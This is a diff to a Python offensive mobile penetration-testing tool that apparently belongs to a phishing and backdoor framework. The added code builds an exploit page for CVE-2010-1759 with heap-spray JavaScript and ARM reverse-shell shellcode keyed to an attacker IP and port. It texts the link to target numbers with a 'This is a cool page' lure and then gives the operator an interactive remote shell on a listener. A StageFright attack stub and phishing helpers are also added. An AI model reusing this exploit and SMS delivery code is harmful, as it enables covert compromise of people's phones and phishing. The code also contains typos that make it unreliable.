@@ -5,6 +5,7 @@ import time
 import subprocess
 import signal
 import getopt
+import socket
 import re
 import xml.etree.ElementTree as ET
 import zipfile
@@ -43,11 +44,16 @@ def usage():
     print "\t-k <api key>"
     print "-Stop <poller> to shutdown (api, modem, agent,all)"
     print "-Report <reporting function> (get, drop)"
-    print "-Client <side attack> (name of attack to throw or list to see all attacks I know)"
+    print "-Client <side attack> (name of attack to throw or list to see all attack)"
     print "\t-n/-N <number/file of numbers> to attack"
     print "\t-p port for listener/shellcode"
     print "\t-f file name for exploit"
     print "\t-u url path for exploit"
+    print "\t-t <custom text> for SMS"
+    print "-Remote <attack> (name of attack to throw or list to all attacks)"
+    print "\t-n/-N <number/file of numbers> to attack"
+    print "\t-p port for listener/shellcode"
+    print "\t-t <custom text> for SMS"
     print 
 def main(argv):
     if len(sys.argv) < 2:
@@ -65,9 +71,10 @@ def main(argv):
     report = False
     agent = False
     clientside = False
+    remote = False
     key = "KEYKEY1"
-    url = "/modemtest"
-    page = "/index.html"
+    url = None
+    page = None
     clone = None
     campaignlabel = "blank"
     number = None
@@ -106,6 +113,9 @@ def main(argv):
     if argv[0] == '-Client':
 	clientside = True
         whichclientside = argv[1]
+    if argv[0] == '-Remote':
+	remote = True
+	whichremote = argv[1]
     for opt, arg in opts:
         if opt == '-n':
             number = arg
@@ -148,7 +158,13 @@ def main(argv):
 	    if whichclientside == "list":
 		list_client_sides()
 	    else :
-		client_side_attack(whichclientside,number,numbersfile,url,file,port)
+		client_side_attack(whichclientside,number,numberfile,url,file,port,text,"yes")
+    if remote == True:
+            if whichremote == "list":
+                list_remote()
+            else :
+                remote_attack(whichremote,number,numberfile,port,text)
+
     if agent == True:
         if agentparam == "list":
             list_live_agents()
@@ -175,23 +191,167 @@ def main(argv):
         if phishtype == "autoagent":
             autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,signing,jarsignalias,keypass,deliverymethod)
         if phishtype == "autopwn":
-	    autopwnphish(url,text,number,numberfile,page)
+	    autopwnphish(url,text,number,numberfile,page,campaignlabel)
 
+def autopwnphish(url,text,number,numberfile,page,campaignlabel):
+    if url[0] != '/':
+             url = "/" + url
+    if text == None:
+        text = "This is a cool page: "
+    webserver = config.get("WEBSERVER")
+    ipaddress = config.get("IPADDRESS")
+    if check_mysql() == 0:
+        os.system("service mysql start>/dev/null")
+    try:
+        db = DB(config=config)
+    except DBException as e:
+        if e[0] == 2:
+            os.system("mysqladmin -u " + config.get("MYSQLUSER") + " create shevirah -p" + config.get("MYSQLPASS"))
+        else:
+            raise
+    db = DB(config=config)
+    db.query("create table if not exists clientsides (id SERIAL NOT NULL PRIMARY KEY, number varchar(12), exploit varchar(200), vuln varchar(3))")
+    localpath = webserver + url
+    if not os.path.exists(localpath):
+            command1  = "mkdir -p " + localpath
+            os.system(command1)
+    #if number != None:
+			
 def list_client_sides():
     print "\t1.) CVE-2010-1759"
     print "\t2.) CVE-2013-4710"
-
-def client_side_attack(whichclientside,number,numbersfile,url,file,port):
+def list_remote():
+    print "\t1.) CVE-2015-1538 (StageFright)"
+def remote_attack(whichremote,number,numberfile,port,text):
+	print "Something"
+def client_side_attack(whichclientside,number,numberfile,url,file,port,text,send):
+         webserver = config.get("WEBSERVER")
+         ipaddress = config.get("IPADDRESS")
+         shellipaddress = config.get("SHELLIPADDRESS")
 	 if port == None:
                  port = config.get("SHELLPORT")
 	 if file == None:
 		file = config.get("CLIENTSIDEFILENAME")
 	 if url == None:
-		url = config.get("CLIENTSIDEPATH")	
+		url = config.get("CLIENTSIDEPATH")
+	 if url[0] != '/':
+          	url = "/" + url
+	 if file[0] != '/':
+		file = "/" + file
+	 if whichclientside == "CVE-2010-1759" or 1:
+	    link = "http://" + ipaddress + url + file
+            fullpath = webserver  + url
+            command1 = "mkdir " + fullpath
+            os.system(command1)
+            octets = shellipaddress.split('.')
+            hex1 = "%.2x"%int(octets[0])
+            hex2 = "%.2x"%int(octets[1])
+            hex3 = "%.2x"%int(octets[2])
+            hex4 = "%.2x"%int(octets[3])
+            porthex = "%.2x"%int(port)
+	    if len(porthex) == 4:
+		porthex1 = porthex[:2]
+		prothex2 = porthex[-2:]
+	    elif len(porthex) == 3:
+		porthex1 = "0" + porthex[:1]
+		porthex2 = porthex[-2:]
+	    elif len(porthex) == 2:
+		porthex1 = "00"
+		prothex2 = porthex
+            sploitfile = webserver + url + file
+            command8 = "touch " + sploitfile
+            os.system(command8)
+            command9 = "chmod 777 " + sploitfile
+            os.system(command9)
+            with open(sploitfile, 'w') as f:
+                  lines = [
+                    "<html>\n",
+                    "<head>\n",
+                    "<script>\n",
+                    "var ip = unescape(\"\\u" + hex2 + hex1 + "\\u" + hex4 + hex3 + "\");\n",
+                    "var port = unescape(\"\\u" + porthex2 + porthex1 + "\");\n",
+                    "function trigger()\n",
+                    "{\n",
+                    "var span = document.createElement(\"div\");\n",
+                    "document.getElementById(\"BodyID\").appendChild(span);\n",
+                    "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n",
+                    "}\n",
+                    "function exploit()\n",
+                    "{\n",
+                    "var nop = unescape(\"\\u33bc\\u0057\");\n",
+                    "do\n",
+                    "{\n",
+                    "nop+=nop;\n",
+                    "} while (nop.length<=0x1000);\n",
+                    "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n",
+                    "scode += port;\n",
+                    "scode += ip;\n",
+                    "scode += unescape(\"\\u2000\\u2000\");\n",
+                    "target = new Array();\n",
+                    "for(i = 0; i < 0x1000; i++)\n",
+                    "target[i] = scode;\n",
+                    "for (i = 0; i <= 0x1000; i++)\n",
+                    "{\n",
+                    "document.write(target[i]+\"<i>\");\n",
+                    "if (i>0x999)\n",
+                    "{\n",
+                    "trigger();\n",
+                    "}\n",
+                    "}\n",
+                    "}\n",
+                    "</script>\n",
+                    "</head>\n",
+                    "<body id=\"BodyID\">\n",
+                    "Enjoy!\n",
+                    "<script>\n",
+                    "exploit();\n",
+                    "</script>\n",
+                    "</body>\n",
+                    "</html>\n",
+                  ]
+                  f.writelines(lines)
+	    if send == "yes":
+	    	if text == None:
+               		text = "This is a cool page: "
+	    	if number != None:
+               		fulltext = text + " " + link
+                        sendsms(number,fulltext)
+                elif numberfile != None:
+                   with open(numberfile) as f:
+                      lines = f.readlines()
+                      for line in lines:
+                          line = line.strip()
+                          fulltext = text +" " +link
+                          sendsms(line,fulltext)
+	    vulnerable = "no"
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(180)
+            s.bind((str(shellipaddress), int(port)))
+            s.listen(1)
+            data_socket = None
+            try:
+                    data_socket, addr = s.accept()
+            except socket.timeout:
+                    pass
+            if data_socket:
+		    vulnerable = "yes"
+                    print "Connected: Try exit to quit"
+                    data="/system/bin/id\n"
+                    data_socket.sendall(data)
+                    data = data_socket.recv(1024)
+                    print data
 
-def autopwnphish(url,text,number,numberfile,page):
-	os.system("service postgresql start >/dev/null")
-	os.system("service metasploit start >/dev/null")
+                    while True:
+                        data = raw_input().strip()
+
+                        if data == "exit":
+                             data_socket.close()
+                             break
+                        data = data + "\n"
+                        data_socket.sendall(data)
+                        data = data_socket.recv(1024)
+                        print data
+            print "\nVulnerable: " + vulnerable
 
 def agentcommand(number,command,agentparameters,deliverymethod):
     if command == "SPAM":     
@@ -944,6 +1104,8 @@ def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,delive
 def harvesterphish(url,text,number,numberfile,campaignlabel,clone,page):
     if url[0] != '/':
           url = "/" + url
+    if page == None:
+	 page = "/index.html"
     if text == None:
         text = "This is a cool page: "
     webserver = config.get('WEBSERVER')
@@ -989,6 +1151,10 @@ def harvesterphish(url,text,number,numberfile,campaignlabel,clone,page):
                     sendsms(line,fulltext)
 
 def clonepage(clone,url,page):
+    if url[0] != '/':
+          url = "/" + url
+    if page == None:
+	page = "/index.html"
     dagahdir = os.getcwd()
     clonesdir = config.get("CLONESLOC")
     useragent = config.get("USERAGENT")
